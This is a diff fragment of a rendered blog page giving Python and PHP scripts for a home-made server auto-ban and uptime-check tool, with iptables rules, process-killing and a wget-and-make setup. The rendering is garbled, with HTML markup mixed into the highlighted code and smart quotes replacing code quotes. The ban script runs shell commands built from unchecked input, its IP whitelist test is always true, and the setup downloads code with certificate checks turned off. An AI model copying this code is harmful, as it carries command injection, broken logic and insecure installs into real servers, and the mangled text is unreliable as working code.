+</span><span class='line'>                <span class="k">if</span> <span class="n">Ban</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>                    <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">.&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">text_word</span><span class="p">:</span>
+</span><span class='line'>                        <span class="n">skip</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>                        <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">or</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">176.9</span><span class="o">.</span><span class="mf">183.142</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">or</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">79.175</span><span class="o">.</span><span class="mf">163.84</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">text_word</span><span class="p">:</span>
+</span><span class='line'>                            <span class="n">skip</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>                        <span class="k">if</span> <span class="n">skip</span> <span class="ow">is</span> <span class="mi">0</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'>                            <span class="n">deny</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">I</span> <span class="n">INPUT</span> <span class="o">-</span><span class="n">s</span> <span class="o">%</span><span class="n">s</span> <span class="o">-</span><span class="n">j</span> <span class="n">DROP</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">%</span><span class="n">text_word</span> <span class="c"># it use iptables to ban users</span>
+</span><span class='line'>                            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">deny</span><span class="p">)</span>
+</span><span class='line'>                            <span class="n">deny</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">A</span> <span class="n">INPUT</span>  <span class="o">-</span><span class="n">s</span> <span class="o">%</span><span class="n">s</span> <span class="o">-</span><span class="n">j</span> <span class="n">DROP</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">%</span><span class="n">text_word</span>
+</span><span class='line'>                            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">deny</span><span class="p">)</span>
+</span><span class='line'>                            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">service</span> <span class="n">iptables</span><span class="o">-</span><span class="n">persistent</span> <span class="n">save</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>                            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">service</span> <span class="n">iptables</span><span class="o">-</span><span class="n">persistent</span> <span class="n">restart</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>                            <span class="n">ipsave</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Banned</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">a</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span> <span class="c">#save ip banned for me</span>
+</span><span class='line'>                            <span class="n">ip_add</span> <span class="o">=</span> <span class="n">text_word</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+</span><span class='line'>                            <span class="n">ipsave</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ip_add</span><span class="p">)</span>
+</span><span class='line'>                            <span class="n">ipsave</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>            <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">IPs</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>     <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">service</span> <span class="n">apache2</span> <span class="n">start</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">And</span> <span class="n">this</span> <span class="nb">file</span> <span class="ow">is</span> <span class="n">going</span> <span class="n">to</span> <span class="n">check</span> <span class="n">server</span> <span class="p">[</span><span class="k">if</span> <span class="n">crash</span> <span class="ow">or</span> <span class="ow">not</span> <span class="nb">open</span><span class="p">]</span> <span class="kn">from</span> <span class="nn">inside</span> <span class="nn">of</span> <span class="nn">your</span> <span class="nn">server</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
+</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>  <span class="c">#start multiprocessing</span>
+</span><span class='line'><span class="n">Attack</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">Ready_Target</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">black</span><span class="o">-</span><span class="n">hg</span><span class="o">.</span><span class="n">org</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'>        <span class="n">connection</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">Ready_Target</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">connection</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">GET</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>        <span class="n">response</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
+</span><span class='line'>        <span class="n">E404</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">404</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>     <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'>        <span class="n">ENot</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">Not</span> <span class="n">Found</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="c">#</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">E404</span> <span class="o">==</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="ow">or</span> <span class="n">E404</span> <span class="o">==</span> <span class="n">response</span><span class="o">.</span><span class="n">reason</span> <span class="ow">or</span> <span class="n">ENot</span> <span class="o">==</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="ow">or</span> <span class="n">ENot</span> <span class="o">==</span> <span class="n">response</span><span class="o">.</span><span class="n">reason</span><span class="p">:</span>
+</span><span class='line'>            <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">yes</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>       <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'>            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>            <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">yes</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>       <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'>            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">E</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>    <span class="k">except</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPException</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">E</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>        <span class="n">Attack</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span class='line'>    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">E</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>        <span class="n">Attack</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span class='line'>    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">E</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>        <span class="n">Attack</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span class='line'>    <span class="k">except</span> <span class="ne">IOError</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">E</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>        <span class="n">Attack</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">Attack</span> <span class="ow">is</span> <span class="mi">10</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">python</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">ban</span><span class="o">.</span><span class="n">py</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>        <span class="n">Attack</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">This</span> <span class="nb">file</span> <span class="n">will</span> <span class="n">check</span> <span class="n">your</span> <span class="n">server</span> <span class="n">status</span> <span class="kn">from</span> <span class="nn">another</span> <span class="nn">host</span><span class="p">,</span> <span class="n">you</span> <span class="n">must</span> <span class="n">change</span> <span class="n">check</span><span class="o">.</span><span class="n">php</span> <span class="nb">file</span> <span class="n">address</span> <span class="ow">and</span> <span class="n">upload</span> <span class="n">check</span><span class="o">.</span><span class="n">php</span> <span class="n">on</span> <span class="n">other</span> <span class="n">hosting</span> <span class="p">[</span><span class="n">you</span> <span class="n">can</span> <span class="n">use</span> <span class="n">free</span> <span class="n">hosting</span><span class="p">]</span> <span class="ow">and</span> <span class="n">put</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">script</span><span class="o">.</span> <span class="n">And</span> <span class="n">notice</span> <span class="n">you</span> <span class="n">must</span> <span class="n">change</span> <span class="s">&#39;z3r0d4y&#39;</span> <span class="n">word</span> <span class="n">to</span> <span class="n">your</span> <span class="n">site</span> <span class="n">title</span><span class="o">.</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;</span><span class="n">python</span> <span class="n">out</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/out.py&quot;</span><span class="o">&gt;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ali</span><span class="o">-</span><span class="n">Razmjoo</span><span class="o">/</span><span class="n">z3r0d4y</span><span class="o">/</span><span class="n">blob</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">out</span><span class="o">.</span><span class="n">py</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
+</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>  <span class="c">#start multiprocessing</span>
+</span><span class='line'><span class="n">err_c</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">opnurl</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://z3r0d4y.com/check.php&quot;</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">z3r0d4y</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">check</span><span class="o">.</span><span class="n">php</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span class='line'>        <span class="n">E</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>        <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">z3r0d4y</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">opnurl</span><span class="p">:</span>
+</span><span class='line'>            <span class="n">E</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>    <span class="k">except</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">E</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>        <span class="n">err_c</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">E</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">python</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">ban</span><span class="o">.</span><span class="n">py</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>        <span class="n">err_c</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">err_c</span> <span class="ow">is</span> <span class="mi">100</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>And now kill.py for stop process.
+<figure class='code'><figcaption><span>kill.py <a href="https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/kill.py">https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/kill.py</a></p></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">By</span> <span class="n">Ali</span> <span class="n">Razmjoo</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
+</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span> <span class="c">#start multiprocessing</span>
+</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">ps</span> <span class="n">aux</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">.</span><span class="n">py</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="nb">id</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="nb">id</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">rsplit</span><span class="p">()</span>
+</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">pid</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span><span class='line'>        <span class="n">cmd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">kill</span> <span class="o">-</span><span class="mi">9</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">except</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">skip</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">At</span> <span class="n">last</span> <span class="n">check</span><span class="o">.</span><span class="n">php</span> <span class="nb">file</span> <span class="n">content</span><span class="p">,</span> <span class="n">It</span><span class="s">&#39;s simple. Just a file open my site and print the content.</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;</span><span class="n">php</span> <span class="n">check</span><span class="o">.</span><span class="n">php</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/check.php&quot;</span><span class="o">&gt;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ali</span><span class="o">-</span><span class="n">Razmjoo</span><span class="o">/</span><span class="n">z3r0d4y</span><span class="o">/</span><span class="n">blob</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">check</span><span class="o">.</span><span class="n">php</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
+</span><span class='line'><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="err">?</span><span class="n">php</span>
+</span><span class='line'><span class="err">$</span><span class="n">homepage</span> <span class="o">=</span> <span class="n">file_get_contents</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://z3r0d4y.com/&quot;</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">z3r0d4y</span><span class="o">.</span><span class="n">com</span><span class="o">/&lt;/</span><span class="n">a</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
+</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="n">homepage</span><span class="p">){</span>
+</span><span class='line'><span class="n">echo</span> <span class="err">$</span><span class="n">homepage</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="err">?</span><span class="o">&gt;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span>
+</span><span class='line'><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">br</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">Setup</span> <span class="n">example</span><span class="p">:</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;</span><span class="n">bash</span>
+</span><span class='line'><span class="n">wget</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/service.zip?raw=true&quot;</span><span class="o">&gt;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ali</span><span class="o">-</span><span class="n">Razmjoo</span><span class="o">/</span><span class="n">z3r0d4y</span><span class="o">/</span><span class="n">blob</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">service</span><span class="o">.</span><span class="n">zip</span><span class="err">?</span><span class="n">raw</span><span class="o">=</span><span class="n">true</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="n">no</span><span class="o">-</span><span class="n">check</span><span class="o">-</span><span class="n">certificate</span>
+</span><span class='line'><span class="n">unzip</span> <span class="n">service</span><span class="o">.</span><span class="n">zip</span>
+</span><span class='line'><span class="n">cd</span> <span class="n">service</span>
+</span><span class='line'><span class="n">mv</span> <span class="o">*</span> <span class="o">../</span>
+</span><span class='line'><span class="n">cd</span> <span class="o">..</span>
+</span><span class='line'><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="n">service</span>
+</span><span class='line'><span class="n">cd</span> <span class="n">daemon</span>
+</span><span class='line'><span class="n">make</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">If</span> <span class="k">return</span> <span class="n">you</span> <span class="nb">any</span> <span class="n">error</span><span class="o">.</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;</span><span class="n">bash</span>
+</span><span class='line'><span class="n">yum</span> <span class="n">install</span> <span class="n">gcc</span>
+</span><span class='line'><span class="n">gcc</span> <span class="n">start</span><span class="o">-</span><span class="n">stop</span><span class="o">-</span><span class="n">daemon</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">start</span><span class="o">-</span><span class="n">stop</span><span class="o">-</span><span class="n">daemon</span>
+</span><span class='line'><span class="n">cp</span> <span class="n">start</span><span class="o">-</span><span class="n">stop</span><span class="o">-</span><span class="n">daemon</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span>
